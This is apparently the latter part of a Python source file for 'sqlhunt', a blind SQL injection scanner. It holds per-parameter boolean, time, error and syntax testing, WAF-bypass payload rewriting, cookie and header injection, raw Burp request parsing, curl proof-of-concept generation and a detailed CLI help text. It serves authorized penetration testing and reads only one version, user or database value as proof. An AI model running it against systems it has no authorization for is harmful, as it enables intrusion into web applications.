            return self._only_wanted(pts, url, wanted)

        if self.args.headers:
            skip = self.http.auth.names_for(url) if self.http.auth else set()
            wanted = [h for h in INJECTABLE_HEADERS if h.lower() not in skip]
            if len(wanted) != len(INJECTABLE_HEADERS):
                self.con.info(f"{len(INJECTABLE_HEADERS) - len(wanted)} "
                              f"header(s) held back — supplied by an auth file")
            self.con.info(f"header testing enabled ({len(wanted)} headers)")
            for h in wanted:
                # base is the header's normal value, so the payload trails a
                # realistic User-Agent / Referer / IP rather than standing alone
                pts.append(Point(url, h, header=h,
                                 base=(self.http.header_for(url, h)
                                       or HEADER_BASE.get(h, ""))))
        return pts

    # -- per-point

    def _poc(self, pt: Point, injected: str) -> str:
        """
        Reproduce the confirming request as a curl command / URL.

        Every argument goes through shlex.quote. Payloads carry single quotes
        by construction -- that is the whole point of a string context -- and
        wrapping one in '...' by hand produces a command line that ends the
        quoting in the middle of the payload and no longer reproduces anything.
        """
        cookie = f" -b {shlex.quote(self.req_cookie)}" if self.req_cookie else ""
        if pt.inject == "cookie":
            jar = dict(pt.cookies or {})
            jar[pt.param] = injected
            jar_s = shlex.quote(build_cookie_header(jar))
            if pt.method == "POST" and pt.data:
                return (f"curl -sk -X POST {shlex.quote(pt.url)} -b {jar_s} "
                        f"--data {shlex.quote(urlencode(pt.data))}")
            return f"curl -sk {shlex.quote(pt.url)} -b {jar_s}"
        if pt.header:
            hv = shlex.quote(f"{pt.header}: {injected}")
            if pt.method == "POST" and pt.data:
                return (f"curl -sk -X POST {shlex.quote(pt.url)} -H {hv} "
                        f"--data {shlex.quote(urlencode(pt.data))}" + cookie)
            return f"curl -sk {shlex.quote(pt.url)} -H {hv}" + cookie
        if pt.inject == "query" and pt.method == "POST":
            u = set_query_param(pt.url, pt.param, injected)
            return (f"curl -sk -X POST {shlex.quote(u)} "
                    f"--data {shlex.quote(urlencode(pt.data) if pt.data else '')}"
                    + cookie)
        if pt.inject == "body" or (pt.method == "POST" and pt.inject != "query"):
            body = dict(pt.data or {})
            body[pt.param] = injected
            return (f"curl -sk -X POST {shlex.quote(pt.url)} "
                    f"--data {shlex.quote(urlencode(body))}" + cookie)
        if pt.method == "GET" and pt.data is None:
            u = set_query_param(pt.url, pt.param, injected)
            return (f"curl -sk {shlex.quote(u)}" + cookie) if cookie else u
        return ""

    def test_point(self, pt: Point, baseline: Response) -> bool:
        """True when this point was confirmed injectable."""
        label = f"{pt.method} {pt.name} ({pt.location})"
        self.con.test(f"{label} @ {pt.url}")

        conf = None
        if not self.args.no_boolean:
            conf = self.tester.boolean(pt, baseline)
            self.bump()
        self.tester.reasons.clear()
        self._why_not = ""
        syn = None
        if conf is None and not getattr(self.args, "no_syntax", False):
            # No differential anywhere does not mean no injection: the query's
            # result may simply never reach the page. Whether it PARSES still
            # does.
            syn = self.tester.syntax(pt, baseline)
            self.bump()
        tamper = "plain"
        if syn is not None:
            # The quote is proven, so a payload that MUST render like the
            # baseline is available -- which turns "can this point carry a
            # space?" into a measurement instead of an assumption.
            q = syn.context.stack[:1] or "'"
            found = self.tester.transport(pt, baseline, q)
            self.bump()
            if not found:
                self.con.warn(f"  {pt.name}: the quote is proven but no probe "
                              f"renders like the baseline — payload transport "
                              f"is unclear, continuing unmodified")
            elif found != "plain":
                self.con.info(f"  {pt.name}: this point does not carry a "
                              f"space; payloads rewritten with '{found}'")
                tamper = found
                # Worth retrying the family that already failed: it failed on
                # payloads the point was silently cutting.
                if not self.args.no_boolean:
                    conf = self.tester.boolean(pt, baseline, tamper=tamper)
                    self.bump()
        if conf is None and syn is not None \
                and not getattr(self.args, "no_error", False):
            # The quote is now proven, so the error family sweeps the contexts
            # built on it first -- cheaper, and it is the one most likely to
            # land.
            conf = self.tester.error_based(pt, baseline, only_ctx=syn.context,
                                           tamper=tamper)
            self.bump()
        if conf is None and not self.args.no_time:
            conf = self.tester.time_based(pt, tamper=tamper)
            self.bump()
        if conf is None and syn is None \
                and not getattr(self.args, "no_error", False):
            # last resort: the difference may exist and be too small to see.
            # Forcing an error on the FALSE branch makes it visible.
            conf = self.tester.error_based(pt, baseline)
            self.bump()
        if conf is None and syn is not None:
            self._why_not = self.tester.why_not()
            self.con.warn(f"  {pt.name}: confirmed, but no oracle — "
                          f"{self._why_not}")
            # Confirmed, and no family could turn it into a question the
            # database will answer. A finding without a value read is still a
            # finding; saying so is better than dropping it. Earlier this
            # branch was taken BEFORE the time family had run, so a target that
            # would have answered a delay was reported as syntax-only.
            conf = syn
        if conf is None:
            self.con.test(f"  {pt.name}: not injectable")
            return False

        self.con.info(f"  {pt.name}: {conf.kind}-based blind SQLi confirmed "
                      f"in context {conf.context.label}")

        dbms_name, poc_value, poc_kind = self.reader.read(pt, conf, baseline)

        injected = pt.current() + conf.true_payload
        poc = self._poc(pt, injected)

        self.add(Finding(
            title=f"Blind SQL injection ({conf.kind}-based)",
            url=pt.url, param=pt.name, sev=CRIT,
            location=pt.location, method=pt.method,
            technique=f"{conf.kind}-based blind, statement context "
                      f"'{conf.context.label}'",
            dbms=dbms_name or (conf.dbms.name if conf.dbms else ""),
            poc_value=poc_value, poc_kind=poc_kind,
            payload=injected,
            evidence=conf.evidence + (
                f"\nNo oracle could be built on top of it, so nothing was "
                f"read: {self._why_not}." if conf.kind == "syntax" else "") + (
                f"\n{PocReader.LABEL.get(poc_kind, poc_kind).capitalize()} read "
                f"as proof of concept; no table data was accessed."
                if poc_value else ""),
            poc=poc))
        return True

    # -- driver

    def _drive(self, url: str, points: list, base: Response):
        """
        Test every point, stopping once --confirm-x of them are confirmed.

        One confirmed injection is usually enough to write the report; the
        budget spent proving the same flaw on a fourth parameter of the same
        page buys nothing and is better spent on the next host. 0 disables the
        cap.
        """
        limit = max(0, getattr(self.args, "confirm_x", 0) or 0)
        hits = 0
        for pt in points:
            try:
                if self.test_point(pt, base):
                    hits += 1
                    if limit and hits >= limit:
                        left = len(points) - points.index(pt) - 1
                        if left > 0:
                            self.con.info(
                                f"{hits} finding(s) confirmed >= --confirm-x "
                                f"({limit}) — {left} remaining point(s) skipped "
                                f"on this URL")
                        return
            except Exception as e:
                self.con.error(f"{url} [{pt.name}]: {type(e).__name__}: {e}")

    def scan(self, url: str):
        self.con.banner(f"Scanning {url}")
        base = self.preflight(url)
        if base is None:
            return
        self.con.info(f"{base.status} {len(base.body)} bytes "
                      f"({base.elapsed:.2f}s)")
        if self.learn_cookies(url, base):
            # the jar is now sent on every request, so the baseline every
            # oracle compares against has to be taken with it
            again = self.preflight(url)
            if again is not None:
                base = again
        self.tester.calibrate(lambda: self.http.send(url), base)
        points = self.points_for(url, base)
        self.con.info(f"{len(points)} injection point(s)")
        self._drive(url, points, base)

    # -- raw request driver (-r)

    def points_for_request(self, spec: "RequestSpec") -> list[Point]:
        """
        Injection points from a captured request: query parameters, POST body
        parameters (unless --no-post) and request headers (only with --headers).
        Every point carries the request's own verb and body, so each payload is
        placed in one spot while the rest of the request stays valid.
        """
        url = spec.url
        post_body = dict(spec.body_params) if spec.method == "POST" else None
        pts: list[Point] = []

        # query parameters
        for k, v in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            pts.append(Point(url, k, method=spec.method, data=post_body,
                             base=v, inject="query"))

        # POST body parameters
        if spec.body_params and not self.args.no_post:
            for k, v in spec.body_params.items():
                pts.append(Point(url, k, method=spec.method,
                                 data=dict(spec.body_params), base=v, inject="body"))
        elif spec.body_params and self.args.no_post:
            self.con.info(f"POST body params skipped (--no-post): "
                          f"{list(spec.body_params)}")

        # cookies, one at a time
        pts.extend(self.cookie_points(url, method=spec.method, body=post_body))

        # request headers
        if self.args.headers:
            skip = self.http.auth.names_for(url) if self.http.auth else set()
            wanted = [h for h in INJECTABLE_HEADERS if h.lower() not in skip]
            if len(wanted) != len(INJECTABLE_HEADERS):
                self.con.info(f"{len(INJECTABLE_HEADERS) - len(wanted)} "
                              f"header(s) held back — supplied by an auth file")
            self.con.info(f"header injection ({len(wanted)} headers)")
            for h in wanted:
                base = (next((v for k, v in spec.headers.items()
                              if k.lower() == h.lower()), "")
                        or HEADER_BASE.get(h, ""))
                pts.append(Point(url, h, method=spec.method, data=post_body,
                                 header=h, base=base, inject="header"))
        else:
            self.con.info("header injection off (pass --headers to enable)")
        return self._only_wanted(pts, url, self.wanted_params(),
                                 spec.method, post_body)

    def run_request(self, spec: "RequestSpec"):
        url = spec.url
        self.con.banner(f"Scanning (raw request) {spec.method} {url}")
        post_body = dict(spec.body_params) if spec.method == "POST" else None
        base = self.preflight(url, method=spec.method, data=post_body)
        if base is None:
            return
        self.con.info(f"{base.status} {len(base.body)} bytes "
                      f"({base.elapsed:.2f}s)")
        if self.learn_cookies(url, base):
            again = self.preflight(url, method=spec.method, data=post_body)
            if again is not None:
                base = again
        self.tester.calibrate(
            lambda: self.http.send(url, spec.method, data=post_body), base)
        points = self.points_for_request(spec)
        self.con.info(f"{len(points)} injection point(s)")
        self._drive(url, points, base)


# ----------------------------------------------------------------------------
# cli
# ----------------------------------------------------------------------------

BANNER = r"""
  sqlhunt — blind SQL injection tester
  authorized testing only
"""

EPILOG = """
scope of this tool
  Blind only: boolean-based, time-based, an error-based oracle as the fallback
  when neither of the first two can see the difference, and a syntax probe for
  the case none of them applies -- an application that runs a query on the
  input and never puts the result on the page. That probe breaks the string
  literal, repairs it and comments it out, and reads which responses are alike;
  it does not parse error text, and never matches on the wording of a database
  message. No UNION, no stacked queries except where a delay has no other form
  (MSSQL), nothing that writes.

proof of concept
  On a hit, exactly ONE short value is read out of the database, chosen with
  --poc:
    banner  the version string (@@version / version() / sqlite_version() ...)
    user    the current account (CURRENT_USER() / current_user / SYSTEM_USER)
    db      the current database (DATABASE() / current_database() / DB_NAME())
  The expressions are hardcoded per engine; there is no option to read tables,
  columns or rows. That is a deliberate limit -- any of these three proves the
  injection reaches the engine, which is what a report needs. Dumping customer
  data is not part of proving a bug.
  SQLite has neither an account nor a meaningful current database; --poc user
  or db falls back to the banner there and says so.

page comparison
  Every oracle here rests on "same request, same page", which is measured
  rather than assumed: the request is replayed twice before any payload is
  sent, and whatever changed on its own -- an anti-CSRF token, a nonce, a
  request id -- is masked out of every later comparison. A page that still
  does not repeat itself is reported as such instead of being scanned in
  silence. The payload the page echoes back, and the parameter's own value,
  are stripped from BOTH sides before comparing (--no-calibrate turns the two
  repeat requests off).

confirmation
  Syntax hits need four responses to line up in one direction and two more to
  repeat it, including a control character that has no meaning inside the
  literal -- which is what separates a parser reacting from a filter reacting.
  A syntax hit proves the injection and gives no way to ask the database a
  question, so the context it proved is handed to the error family, which
  sweeps that one shape for an engine and a value to read; when that finds
  nothing the finding stands on its own and says plainly that nothing was
  extracted.

  Boolean hits take one of two routes. When the two branches render as
  visibly different pages, a similarity split plus a second, unrelated
  condition pair. When they are nearly identical -- a conditional response is
  often one line inside a catalogue, 67 bytes in 4700, which is 0.98 alike by
  any honest measure -- the split is replaced by a MARKER: a fragment present
  on one branch and absent from the other, which has to move the same way
  again under a second pair, on a page calibration measured to repeat itself
  byte for byte. Similarity is computed over word n-grams rather than
  fixed-width character windows, so where the difference sits in the page no
  longer changes what it scores.

  Boolean hits must show a TRUE/FALSE similarity split AND reproduce with a
  second, unrelated condition pair. Time hits must scale with the requested
  delay and survive a zero-delay control. Error hits must come with a control
  that carries the same FALSE condition but nothing to raise and comes back
  byte-identical to TRUE, which is what proves the page deterministic before
  any difference is read as a finding. All three gates exist to keep ordinary
  dynamic pages from reading as injectable.

payload transport
  Once the syntax probe has proved which quote closes the literal, a payload
  that MUST render like the baseline is available, and it answers a question
  no amount of SQL knowledge can: does this injection point carry a space? A
  cookie value is not allowed one (RFC 6265) and a fair number of stacks stop
  reading the value there, so every payload arrives cut at its first space and
  a raising probe comes back as the same error page as its own control. When
  that happens the space is rewritten (/**/, tab, newline, vertical tab, form
  feed -- whichever the point accepts) and the families that already failed
  are run again. One request when nothing is wrong.

contexts and filters
  --level picks how many statement shapes are swept: the classic five, plus
  the comment-free balanced forms and || / + concatenation (default), plus
  backtick and double-parenthesis nesting. --waf adds a second pass that
  crosses alternative whitespace, mixed keyword case, && / ||, MySQL inline
  comments and comparison operators that avoid '=' -- crossed rather than one
  at a time, because a filter worth bypassing blocks several things at once.

authentication
  Most of an application's surface sits behind a login. --auth-file takes one
  file of headers (the -H syntax, '#' for comments) and applies it to every
  target whatever it is called; --auth-dir takes a directory of files named
  after the host they authenticate -- www.example.com.txt for every port of
  that host, www.example.com_8080.txt for that port only, which wins over it.
  The two are mutually exclusive. There is no subdomain inheritance: a file for
  example.com does not authenticate app.example.com, because credentials that
  follow a wildcard land on whatever subdomain happens to resolve, including
  one that has been taken over.

  This is also what -H cannot do. -H feeds one header dict shared by every
  target, so in -l mode a session given that way reaches every host in the
  list. The auth table is keyed by (host, port) and resolved per request, which
  is what makes it correct under -t.

  Priority, lowest first: the captured request (-r), the auth file, then -H.
  Cookie is merged cookie by cookie along that order rather than replaced, so a
  TrackingId from a capture survives a session= from an auth file. Nothing an
  auth file supplies is injected -- the payload would replace the credential
  and everything after it would run unauthenticated, which looks exactly like a
  clean target -- unless -p names it: -p cookie:session or -p header:User-Agent
  test it anyway. Credentials appear as-is in the PoC and at -v 2, so the curl
  in a report is copy-paste reproducible.

injection points
  Query parameters and POST body parameters are tested by default. Request
  headers, cookies included, only with --headers -- or one at a time by naming
  it with -p, which needs no flag. Cookies are tested ONE AT A TIME with the
  rest of the jar replayed intact, because dropping a session cookie costs the
  authentication the vulnerable query needs. The jar is what the request
  carries plus what the target set on the first response, so a tracking cookie
  issued on arrival is reachable from -u alone. That jar is SENT on every
  request whether or not its cookies are tested, and the baseline is retaken
  once the target adds to it: a scan that drops the cookie the server just
  issued is not reproducing the client the application expects.

safety
  Every target you supply is requested. There is no allowlist -- feed it a
  pre-filtered, in-scope list.

  Time-based testing is slow by construction (each probe sleeps). Use --sleep to
  tune it and -d to stay polite.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity:
  hosts tested / total, remaining, and findings by severity. Not shown for -u.

examples
  sqlhunt.py -u 'https://target/item?id=1'
  sqlhunt.py -u 'https://target/item?id=1' -v 1
  sqlhunt.py -l hosts-scope.txt -v 1
  sqlhunt.py -u 'https://target/item?id=1' -p id
  sqlhunt.py -u 'https://target/' -p cookie:TrackingId
  sqlhunt.py -u 'https://target/' --headers
  sqlhunt.py -r request.txt -p body:username
  sqlhunt.py -u 'https://target/item?id=1' -p header:User-Agent
  sqlhunt.py -u 'https://target/s?q=x' -p q,search --waf
  sqlhunt.py -u 'https://target/item?id=1' --headers
  sqlhunt.py -u 'https://target/s?q=x' --no-time --poc-chars 60
  sqlhunt.py -u 'https://target/item?id=1' --poc user
  sqlhunt.py -u 'https://target/item?id=1' --poc db --poc-chars 24
  sqlhunt.py -r request.txt -v 1
  sqlhunt.py -r request.txt --no-post
"""


def load_urls(path: str) -> list[str]:
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line if line.startswith(("http://", "https://"))
                           else "https://" + line)
    return out


# ----------------------------------------------------------------------------
# raw HTTP request (-r)
# ----------------------------------------------------------------------------

# Headers from the request file we must not forward verbatim: requests derives
# them (Host from the URL, Content-Length from the body) or they break decoding
# (Accept-Encoding -> a compressed body needing a lib requests may lack).
_RAW_SKIP_HEADERS = frozenset({
    "host", "content-length", "connection", "proxy-connection", "keep-alive",
    "accept-encoding", "transfer-encoding", "te",
})


@dataclass
class RequestSpec:
    method: str
    url: str
    headers: dict                                    # replayed on every request
    body_params: dict = field(default_factory=dict)  # urlencoded body (name->value)


def _infer_scheme(headers: dict, version: str = "") -> str:
    """
    Which scheme an origin-form request line does not carry.

    Origin/Referer first when they are there. Then the protocol version: a
    browser speaks HTTP/2 over TLS and nothing else -- h2c is not something a
    capture from Burp will show -- so "GET / HTTP/2" with no Origin and no
    Referer is https, where the old default sent the whole scan to http. On a
    target that answers http with a redirect, preflight discarded the 3xx and
    skipped the URL, which reads as "found nothing".
    """
    for h in ("Origin", "Referer"):
        v = headers.get(h) or headers.get(h.lower())
        if v and v.lower().startswith("https://"):
            return "https"
        if v and v.lower().startswith("http://"):
            return "http"
    if version.upper().startswith(("HTTP/2", "HTTP/3")):
        return "https"
    return "http"


def parse_raw_request(path: str, force_ssl: bool = False) -> RequestSpec:
    """
    Parse a raw HTTP request file (Burp/ZAP export) into a RequestSpec: method,
    absolute URL, headers to replay, and urlencoded body parameters. The scheme
    is http by default (inferred from Origin/Referer, or forced with
    --force-ssl) since an origin-form request line does not carry one.
    """
    with open(path, "rb") as fh:
        text = fh.read().decode("utf-8", errors="replace").replace("\r\n", "\n")

    head, _, body = text.partition("\n\n")
    lines = head.split("\n")
    while lines and not lines[0].strip():
        lines.pop(0)
    if not lines:
        raise ValueError("empty request file")

    parts = lines[0].strip().split()
    if len(parts) < 2:
        raise ValueError(f"invalid request line: {lines[0]!r}")
    method, target = parts[0].upper(), parts[1]
    version = parts[2] if len(parts) > 2 else ""

    headers: dict = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, _, v = ln.partition(":")
            if k.strip():
                headers[k.strip()] = v.strip()

    host = headers.get("Host") or headers.get("host")
    if target.startswith(("http://", "https://")):
        url = target
        if force_ssl and url.startswith("http://"):
            url = "https://" + url[len("http://"):]
    else:
        if not host:
            raise ValueError("no Host header and non-absolute URI: "
                             "cannot build the URL")
        scheme = "https" if force_ssl else _infer_scheme(headers, version)
        if not target.startswith("/"):
            target = "/" + target
        url = f"{scheme}://{host}{target}"

    fwd = {k: v for k, v in headers.items() if k.lower() not in _RAW_SKIP_HEADERS}

    body_params: dict = {}
    body = body.strip()
    if body:
        ctype = next((v.lower() for k, v in headers.items()
                      if k.lower() == "content-type"), "")
        looks_form = ("urlencoded" in ctype
                      or ("=" in body and not body.lstrip().startswith(("{", "["))))
        if looks_form:
            pairs = parse_qsl(body, keep_blank_values=True)
            if pairs:
                body_params = dict(pairs)
    return RequestSpec(method, url, fwd, body_params)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="sqlhunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", type=int, default=0, choices=[0, 1, 2], dest="verbosity",
                  help="0 = confirmed findings only (default), 1 = every test, "
                       "2 = debug (similarity scores, timings, rejected hits)")
    p.add_argument("-u", "--url", help="single target URL")
    p.add_argument("-l", "--list", help="file of target URLs, one per line")
    p.add_argument("-r", "--request", metavar="FILE",
                  help="raw HTTP request file (Burp/ZAP export): method, headers "
                       "(Cookie...) and body are replayed, and injection covers "
                       "query params, POST body params and request headers "
                       "(POST body off with --no-post; headers only "
                       "with --headers)")
    p.add_argument("--force-ssl", action="store_true",
                  help="force https for a -r request (default: http, inferred "
                       "from Origin/Referer)")
    p.add_argument("--no-color", action="store_true",
                  help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                  help="seconds between status lines in -l mode (default 30)")
    p.add_argument("-t", "--threads", type=int, default=4,
                  help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0,
                  help="minimum gap between requests (s), enforced globally")
    p.add_argument("--timeout", type=float, default=20.0,
                  help="request timeout (s, default 20)")
    p.add_argument("-H", "--header", action="append", default=[],
                  help="extra header 'Name: value' (repeatable)")
    p.add_argument("-p", "--param", metavar="NAME",
                  help="only test the injection points named here, "
                       "comma-separated. A bare name matches wherever it is "
                       "found; prefix it to say where: query: (or get:, url:), "
                       "body: (or post:, data:), cookie:, header: — e.g. "
                       "'-p cookie:TrackingId,query:id'. A header named this "
                       "way is tested without --headers. A name the request "
                       "does not carry is created in the place the prefix "
                       "says (query string when there is none), so a parameter "
                       "you know about but that is not in the capture can "
                       "still be reached")
    p.add_argument("-x", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--auth-file", metavar="FILE",
                   help="headers to authenticate with, -H syntax, one per "
                        "line, '#' for comments. Applied to EVERY target "
                        "whatever the file is called")
    p.add_argument("--auth-dir", metavar="DIR",
                   help="directory of auth files named after the host they "
                        "authenticate: www.example.com.txt covers every port "
                        "of that host, www.example.com_8080.txt covers that "
                        "port only and wins over it. No subdomain "
                        "inheritance. Only the host a file names receives its "
                        "headers, which is what -H cannot do in -l mode. "
                        "Mutually exclusive with --auth-file")

    g = p.add_argument_group("techniques")
    g.add_argument("--no-boolean", action="store_true", help="skip boolean-based tests")
    g.add_argument("--no-time", action="store_true", help="skip time-based tests")
    g.add_argument("--no-syntax", action="store_true",
                   help="skip the syntax probe (breaking and repairing the "
                        "string literal), tried only when nothing else found "
                        "anything")
    g.add_argument("--no-error", action="store_true",
                   help="skip the error-based oracle (the fallback that forces "
                        "a database error on the FALSE branch when the boolean "
                        "difference is too small to measure)")
    g.add_argument("--confirm-x", type=int, default=3, metavar="N",
                   help="stop testing a URL once N findings are confirmed "
                        "(default 3, 0 for no cap). Proving the same flaw on "
                        "yet another parameter of the same page costs requests "
                        "and adds nothing to the report")
    g.add_argument("--level", type=int, default=2, choices=[1, 2, 3],
                   metavar="N",
                   help="how many statement contexts to sweep. 1: the five "
                        "classic shapes (numeric, quoted, parenthesised). "
                        "2 (default): plus the comment-free balanced forms, "
                        "for filters that strip -- and #, and the || / + "
                        "concatenation forms. 3: plus backtick and "
                        "double-parenthesis nesting. Each level costs requests "
                        "on every point that turns out clean")
    g.add_argument("--waf", action="store_true",
                   help="when nothing is found, retry with filter bypasses: "
                        "comparison operators without '=' (BETWEEN/IN/LIKE), "
                        "alternative whitespace (/**/, tab, newline, vertical "
                        "tab, form feed), mixed keyword case, && and || for "
                        "AND/OR, and MySQL conditional comments. Also opens "
                        "time testing to every context and every per-engine "
                        "delay shape. Costs several times the requests")
    g.add_argument("--sleep", type=int, default=5,
                   help="seconds for the time-based probe (default 5)")
    g.add_argument("--headers", action="store_true",
                   help=f"also inject into request headers, in every mode "
                        f"including -r: the {len(INJECTABLE_HEADERS)} listed "
                        f"ones (User-Agent, Referer, X-Forwarded-For, ...) and "
                        f"every cookie carried by the request or set by the "
                        f"target, one at a time. Off by default because it "
                        f"multiplies the request budget by the number of "
                        f"headers; -p header:NAME or -p cookie:NAME tests one "
                        f"of them without this flag")
    g.add_argument("--no-forms", action="store_true", help="skip form parameters")
    g.add_argument("--no-cookies", action="store_true",
                   help="with --headers, test the listed headers but not the "
                        "cookies")
    g.add_argument("--no-post", action="store_true",
                   help="in -r mode, skip POST body parameters")

    g2 = p.add_argument_group("proof of concept")
    g2.add_argument("--poc", choices=("banner", "user", "db"), default="banner",
                    metavar="WHAT",
                    help="which single value to read as proof: banner (version "
                         "string, default), user (current account), db (current "
                         "database). SQLite has neither user nor db and falls "
                         "back to banner.")
    g2.add_argument("--poc-chars", type=int, default=40, metavar="N",
                    help="max characters to read (default 40)")
    g2.add_argument("--time-poc-chars", type=int, default=12, metavar="N",
                    help="lower cap when only a time oracle is available "
                         "(default 12) — each character costs ~7 sleeps")
    g2.add_argument("--extract-sleep", type=int, default=2, metavar="SEC",
                    help="sleep used per extraction probe (default 2)")

    g3 = p.add_argument_group("detection thresholds")
    g3.add_argument("--true-threshold", type=float, default=0.95, metavar="F",
                    help="min similarity for a TRUE response (default 0.95)")
    g3.add_argument("--false-threshold", type=float, default=0.85, metavar="F",
                    help="max similarity for a FALSE response (default 0.85)")
    g3.add_argument("--min-delta", type=float, default=0.05, metavar="F",
                    help="min TRUE-FALSE similarity gap (default 0.05)")
    g3.add_argument("--no-calibrate", action="store_true",
                    help="skip the two repeat requests that measure what the "
                         "page changes on its own")
    p.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")
    return p


def print_summary(scanner: Scanner, http: Http, urls, elapsed):
    print(f"\n  {paint(str(len([f for f in scanner.findings])), 'b')} finding(s) "
          f"from {http.count} requests in {elapsed:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW, INFO):
        n = sum(1 for f in scanner.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")
    if scanner.skipped:
        print(f"  {paint('skipped', 'warn')}: {len(scanner.skipped)}")
        for s in scanner.skipped:
            print(f"    - {s['url']}  [{s['reason']}]")
    read = {(f.dbms, f.poc_kind): f.poc_value
            for f in scanner.findings if f.poc_value}
    if read:
        print(f"\n  {paint('--- values read (proof of concept only) ---', 'b')}")
        for (d, k), v in read.items():
            print(f"    {d} {PocReader.LABEL.get(k, k)}: {paint(v, 'ok')}")


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not args.url and not args.list and not args.request:
        parser.print_help()
        return 2

    # -p used to mean --proxy here, as it still does in the other tools. Silently
    # treating a proxy URL as a parameter name would produce a scan that looks
    # normal and tests nothing that exists, so say it out loud instead.
    if args.param and re.match(r"^(?:https?|socks\d?)://", args.param.strip()):
        print(f"error: -p now names the parameter to test, not the proxy — "
              f"use -x {args.param} (or --proxy)", file=sys.stderr)
        return 2

    if args.auth_file and args.auth_dir:
        print("error: --auth-file and --auth-dir are mutually exclusive",
              file=sys.stderr)
        return 2

    set_color(not (args.no_color or os.environ.get("NO_COLOR")))

    # -r takes precedence: a single target described by a raw request file
    spec = None
    req_header_list = []
    if args.request:
        if not os.path.isfile(args.request):
            print(f"error: no such file: {args.request}", file=sys.stderr)
            return 2
        try:
            spec = parse_raw_request(args.request, force_ssl=args.force_ssl)
        except Exception as e:
            print(f"error: cannot parse request ({args.request}): {e}",
                  file=sys.stderr)
            return 2
        if args.url or args.list:
            print("note: -r takes precedence; -u/-l ignored", file=sys.stderr)
        urls = [spec.url]
        # request headers first, -H after (so -H can override)
        req_header_list = [f"{k}: {v}" for k, v in spec.headers.items()]
    else:
        urls = []
        if args.url:
            urls.append(args.url if args.url.startswith(("http://", "https://"))
                        else "https://" + args.url)
        if args.list:
            if not os.path.isfile(args.list):
                print(f"error: no such file: {args.list}", file=sys.stderr)
                return 2
            urls.extend(load_urls(args.list))
        urls = list(dict.fromkeys(urls))
    if not urls:
        print("error: no targets", file=sys.stderr)
        return 2

    con = Console(args.verbosity)
    try:
        auth = AuthStore.load(args.auth_file, args.auth_dir, con)
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        return 2
    status = Status(con, len(urls), interval=args.status_interval,
                    enabled=bool(args.list))

    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(urls)), 'b')}   threads {args.threads}   "
          f"timeout {args.timeout:.0f}s")
    hdr_on = args.headers
    print(f"  boolean {paint('off', 'warn') if args.no_boolean else paint('on', 'ok')}"
          f"        time {paint('off', 'warn') if args.no_time else paint('on', 'ok')}"
          f" ({args.sleep}s)"
          f"        headers "
          f"{paint('on', 'ok') if hdr_on else paint('off', 'warn')}"
          f"        PoC {paint(args.poc, 'ok')}"
          + (f"        status every {args.status_interval:.0f}s"
             if status.enabled else ""))
    print()

    auth.describe(con)
    http = Http(con, timeout=args.timeout, delay=args.delay, proxy=args.proxy,
                headers=args.header, req_headers=req_header_list, auth=auth)
    scanner = Scanner(http, con, args, status)
    if spec is not None:
        scanner.req_cookie = next((v for k, v in spec.headers.items()
                                   if k.lower() == "cookie"), "")

    started = time.time()
    status.start()

    def one(u):
        try:
            if spec is not None:
                scanner.run_request(spec)
            else:
                scanner.scan(u)
        except Exception as e:
            con.error(f"{u}: {type(e).__name__}: {e}")
        finally:
            status.host_done()

    try:
        if args.threads > 1 and len(urls) > 1:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=args.threads) as pool:
                list(pool.map(one, urls))
        else:
            for u in urls:
                one(u)
    except KeyboardInterrupt:
        con.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")

    elapsed = time.time() - started
    print_summary(scanner, http, urls, elapsed)

    return 1 if scanner.findings else 0


if __name__ == "__main__":
    sys.exit(main())
